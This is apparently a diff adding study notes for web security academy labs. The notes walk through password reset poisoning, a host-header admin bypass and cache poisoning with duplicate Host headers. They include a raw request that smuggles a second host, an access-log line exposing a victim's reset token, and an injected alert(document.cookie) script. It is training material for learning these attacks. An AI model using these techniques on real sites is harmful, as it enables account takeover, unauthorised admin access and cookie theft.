@@ -1,0 +1,42 @@
+Task 1:
+///Lab: Basic password reset poisoning///
+
+Open the site in Burp, click on forgot password, enter the username wiener and submit. Go to the exploit server /email client, follow the link and change the password if you want. In burps http history check the request.
+You will see a POST /forgot-password and after you clicked on the link in the email u got a POST /forgot-password?temp-forgot-password-token=gmjvh5ra2dnjt1uubktd769hz931fbp8
+Send the /forgot-password to repeater and from the title we know that the host header is changeable, so change it to anything, and if you send it you will get an email, and this changed host header will be into
+the url link what you get.
+Now go back to forgot password turn on intercept, enter the username carlos, and submit. Now. In the catched post request change the host header to your exploit servers url (without the /exploit part). And forward the 
+request. Then in the exploit server click on the access log, and search a line like this:
+10.0.3.162      2026-04-08 09:03:32 +0000 "GET /forgot-password?temp-forgot-password-token=gmjvh5ra2dnjt1uubktd769hz931fbp8 HTTP/1.1"
+This will be carlos's change password token. Copy out the first change email url from the first email, and insert this token value into it. Change the password to anything you want, and login with carlos.
+
+Task 2:
+///Lab: Host header authentication bypass///
+
+Open the site in Burp. From the title we know that the host header is vulnerable and there is an admin panel. So if you type /admin at the end of the url, you will see that only local users can use the admin panel.
+Now turn on intercept and refresh the /admin page. Change the Host header to localhost and forward the request. You will see the admin panel. Click on delete carlos, and in the follow request change the Host again
+to localhost. And then turn off the intercept, and the lab is solved.
+
+Task 3:
+///Lab: Web cache poisoning via ambiguous requests///
+
+Open the site, and send the GET / request to repeater. Notice that we have verbose caching headers:
+Cache-Control: max-age=30
+Age: 0
+X-Cache: miss
+
+So if we add /?asd=123 it will create a new cache key. If we try to change the host header like we did before then we got a 502 gateway timeout. But what if we add one more host header?:
+GET /?cb=asd HTTP/1.1
+Host: 0aca00a103cb9a41801203e700630084.h1-web-security-academy.net
+Host: asd.com
+Cookie: _lab=
+...
+...
+
+The second host header will pop up in the sites source:
+       <script type="text/javascript" src="//asd.com/resources/js/tracking.js"></script>
+Go to exploit server and change the File: to /resources/js/tracking.js and change to body to alert(document.cookie); Copy out the exploit servers url: exploit-0a6f00be034a9ac180c102c6019e00f7.exploit-server.net
+Go back to the repeater, change the second Host header to our url, and modify the GET /?cd=asd to GET /. Then send the request until X-cache will be hit, maybe you have to wait untin the next 30 secs to hit it in.
+
+Task 4:
+///
